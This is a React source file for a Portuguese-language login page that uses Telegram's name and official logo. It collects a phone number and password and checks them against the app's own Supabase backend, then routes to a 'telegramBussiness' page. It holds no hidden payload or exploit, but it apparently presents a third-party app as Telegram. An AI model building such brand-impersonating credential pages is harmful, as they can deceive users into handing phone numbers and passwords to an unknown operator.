import React, { useState, useCallback, useMemo, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { AnimatePresence, motion } from 'motion/react';
import { useToast } from '../components/Toast';
import { supabase } from '../lib/supabase';
import { Eye, EyeOff, Loader2, Search, X, Check, ChevronDown } from 'lucide-react';
import { COUNTRIES, Country } from '../lib/countries';

export default function Login() {
  const navigate = useNavigate();
  const { showToast } = useToast();

  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showPasskey, setShowPasskey] = useState(false);
  const [phone, setPhone] = useState('');
  const [passkey, setPasskey] = useState('');

  // Country selector
  const [selectedCountry, setSelectedCountry] = useState<Country>(() => {
    try {
      const savedCode = localStorage.getItem('saved_dial_code');
      const found = COUNTRIES.find(c => c.dial_code === savedCode);
      return found || COUNTRIES[0];
    } catch {
      return COUNTRIES[0];
    }
  });
  const [showCountryModal, setShowCountryModal] = useState(false);
  const [searchCountry, setSearchCountry] = useState('');

  // Auto-fill saved phone if available
  useEffect(() => {
    try {
      const saved = localStorage.getItem('saved_phone');
      if (saved) setPhone(saved);
    } catch {}
  }, []);

  const togglePasskey = useCallback(() => setShowPasskey(v => !v), []);

  const handlePhoneChange = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, '').slice(0, selectedCountry.maxLength);
    setPhone(val);
  }, [selectedCountry.maxLength]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    const cleanPhone = phone.trim();
    const cleanPasskey = passkey.trim();

    if (!cleanPhone) {
      showToast('Por favor, insira o número de telefone.', 'error');
      return;
    }
    if (!cleanPasskey || cleanPasskey.length < 4) {
      showToast('Por favor, insira a sua senha.', 'error');
      return;
    }

    setIsSubmitting(true);
    try {
      const { data, error } = await supabase.auth.signInWithPassword({
        email: `${cleanPhone}@user.com`,
        password: cleanPasskey,
      });

      if (error) {
        if (error.message.includes('Invalid login credentials')) {
          showToast('Ops! Número ou senha incorrectos. Tente novamente.', 'error');
        } else {
          throw error;
        }
        setIsSubmitting(false);
        return;
      }

      if (data.session) {
        localStorage.setItem('saved_phone', cleanPhone);
        localStorage.setItem('saved_dial_code', selectedCountry.dial_code);
        showToast('Bem-vindo de volta!', 'success');
        navigate('/telegramBussiness');
      } else {
        showToast('Não foi possível iniciar sessão. Verifique os seus dados.', 'error');
      }
    } catch (err: any) {
      showToast(err.message || 'Ops! Ocorreu uma falha na conexão. Tente novamente.', 'error');
    } finally {
      setIsSubmitting(false);
    }
  };

  const filteredCountries = useMemo(() => {
    if (!searchCountry) return COUNTRIES;
    return COUNTRIES.filter(c =>
      c.name.toLowerCase().includes(searchCountry.toLowerCase()) ||
      c.dial_code.includes(searchCountry)
    );
  }, [searchCountry]);

  return (
    <div className="w-full min-h-screen bg-white pb-12 font-sans antialiased text-black select-none flex flex-col items-center justify-center p-4">
      <main className="w-full max-w-[340px] sm:max-w-[360px] flex flex-col items-center">

        {/* ── LOGO OFICIAL TELEGRAM ── */}
        <div className="mb-3.5 flex items-center justify-center">
          <svg viewBox="0 0 240 240" xmlns="http://www.w3.org/2000/svg" className="w-[58px] h-[58px]">
            <defs>
              <linearGradient id="tgLoginGrad" x1=".667" x2=".417" y1=".167" y2=".75">
                <stop offset="0" stopColor="#37aee2"/>
                <stop offset="1" stopColor="#1e96c8"/>
              </linearGradient>
            </defs>
            <circle cx="120" cy="120" r="120" fill="url(#tgLoginGrad)"/>
            <path fill="#c8daea" d="m98 175c-3.888 0-3.227-1.468-4.568-5.17l-11.433-37.594 88.022-52.232"/>
            <path fill="#a9c9dd" d="m98 175c3 0 4.325-1.372 6-3l16-15.558-19.958-12.035"/>
            <path fill="#fff" d="m100.04 144.41 48.36 35.729c5.519 3.045 9.501 1.468 10.876-5.123l19.685-92.763c2.015-8.08-3.08-11.746-8.36-9.349l-115.59 44.571c-7.89 3.165-7.843 7.567-1.438 9.528l29.663 9.259 68.673-43.325c3.242-1.966 6.218-.91 3.776 1.258"/>
          </svg>
        </div>

        {/* ── TÍTULO E SUBTÍTULO ── */}
        <h1 className="text-[26px] font-bold text-center mb-1.5 tracking-tight text-[#1c1c1e]">
          Telegram
        </h1>

        <p className="text-[13px] text-[#8e8e93] text-center mb-6 leading-snug max-w-[280px]">
          Introduza o seu número de telefone e chave de acesso para entrar.
        </p>

        {/* ── FORMULÁRIO DE LOGIN ── */}
        <form onSubmit={handleSubmit} className="w-full flex flex-col gap-4">

          {/* Campos divididos apenas por divisores horizontais */}
          <div className="w-full flex flex-col">
            {/* 1. Telefone com seletor de país */}
            <div className="flex items-center px-1 h-[52px] border-b border-[#e5e5e5]">
              <button
                type="button"
                onClick={() => setShowCountryModal(true)}
                className="flex items-center gap-1 text-[15px] font-medium text-black border-r border-[#e5e5e5] pr-2.5 mr-3 shrink-0 cursor-pointer hover:opacity-70"
                title="Mudar país"
              >
                <span>{selectedCountry.dial_code}</span>
                <ChevronDown className="w-3.5 h-3.5 text-[#8e8e93] stroke-[2.2]" />
              </button>
              <input
                name="phone"
                type="tel"
                inputMode="numeric"
                autoComplete="tel"
                placeholder="Por favor, insira o número de telefone."
                className="flex-1 bg-transparent outline-none text-[15px] text-black placeholder:text-[#c7c7cc] font-normal"
                value={phone}
                onChange={handlePhoneChange}
                maxLength={selectedCountry.maxLength}
              />
            </div>

            {/* 2. Senha */}
            <div className="flex items-center px-1 h-[52px] border-b border-[#e5e5e5]">
              <input
                name="passkey"
                type={showPasskey ? 'text' : 'password'}
                placeholder="Por favor, insira a sua senha."
                className="flex-1 bg-transparent outline-none text-[15px] text-black placeholder:text-[#c7c7cc] font-normal"
                value={passkey}
                onChange={(e) => setPasskey(e.target.value)}
                autoComplete="current-password"
              />
              <button
                type="button"
                onClick={togglePasskey}
                className="ml-2 text-[#c7c7cc] hover:text-[#3390ec] active:opacity-50 transition-colors p-1 cursor-pointer shrink-0"
                aria-label={showPasskey ? 'Ocultar senha' : 'Ver senha'}
              >
                {showPasskey ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
              </button>
            </div>
          </div>

          {/* 3. BOTÕES DE AÇÃO */}
          <div className="w-full pt-1 space-y-2.5">
            <button
              type="submit"
              disabled={isSubmitting}
              className="w-full h-[48px] rounded-[12px] bg-[#3390ec] hover:bg-[#2881dc] active:scale-[0.98] text-white font-semibold text-[15px] transition-all disabled:opacity-50 flex items-center justify-center shadow-xs cursor-pointer"
            >
              {isSubmitting ? <Loader2 className="animate-spin h-5 w-5 text-white" /> : 'Conectar-se'}
            </button>

            <button
              type="button"
              onClick={() => navigate('/messager')}
              className="w-full text-center text-[#3390ec] hover:text-[#2881dc] font-medium text-[14.5px] transition-colors py-2 cursor-pointer hover:underline"
            >
              Não tem conta? Inscrever-se
            </button>
          </div>
        </form>
      </main>

      {/* ════════════════════════════════════════════════════════
          MODAL — Seleção de Países
      ════════════════════════════════════════════════════════ */}
      <AnimatePresence>
        {showCountryModal && (
          <motion.div
            initial={{ opacity: 0, y: '100%' }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: '100%' }}
            transition={{ type: 'tween', ease: 'easeOut', duration: 0.3 }}
            className="fixed inset-0 z-[200] bg-white flex flex-col"
          >
            <div className="h-[56px] px-4 flex items-center border-b border-[#c8c7cc] shrink-0 bg-[#f8f8f8]">
              <button onClick={() => setShowCountryModal(false)} className="text-[#3390ec] text-[17px] font-medium cursor-pointer">
                Voltar
              </button>
              <h2 className="flex-1 text-center text-[17px] font-semibold">Escolha um país</h2>
              <div className="w-[40px]" />
            </div>
            <div className="p-2 bg-[#f8f8f8] border-b border-[#c8c7cc] shrink-0">
              <div className="bg-[#e3e3e8] h-[36px] rounded-[20px] flex items-center px-3">
                <Search className="w-5 h-5 text-[#8e8e93] mr-2" />
                <input
                  type="text"
                  placeholder="Pesquisar país ou código"
                  className="bg-transparent outline-none flex-1 text-[16px] text-black"
                  value={searchCountry}
                  onChange={(e) => setSearchCountry(e.target.value)}
                />
                {searchCountry && (
                  <button onClick={() => setSearchCountry('')} className="bg-[#8e8e93] text-white rounded-full p-0.5 ml-2 cursor-pointer">
                    <X className="w-3 h-3" />
                  </button>
                )}
              </div>
            </div>
            <div className="flex-1 overflow-y-auto">
              {filteredCountries.map((c) => (
                <div
                  key={c.code}
                  className="flex items-center px-4 h-[50px] border-b border-[#c8c7cc] active:bg-gray-100 cursor-pointer"
                  onClick={() => {
                    setSelectedCountry(c);
                    setPhone('');
                    setShowCountryModal(false);
                    setSearchCountry('');
                  }}
                >
                  <img
                    src={`https://flagcdn.com/w40/${c.code.toLowerCase()}.png`}
                    alt={c.name}
                    className="w-8 h-auto rounded-sm object-cover mr-3 shrink-0"
                    onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }}
                  />
                  <span className="flex-1 text-[17px] font-medium text-black">{c.name}</span>
                  <span className="text-[#8e8e93] text-[17px] mr-2">{c.dial_code}</span>
                  {selectedCountry.code === c.code && <Check className="w-5 h-5 text-[#3390ec]" />}
                </div>
              ))}
              {filteredCountries.length === 0 && (
                <div className="p-8 text-center text-[#8e8e93]">Nenhum país encontrado</div>
              )}
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
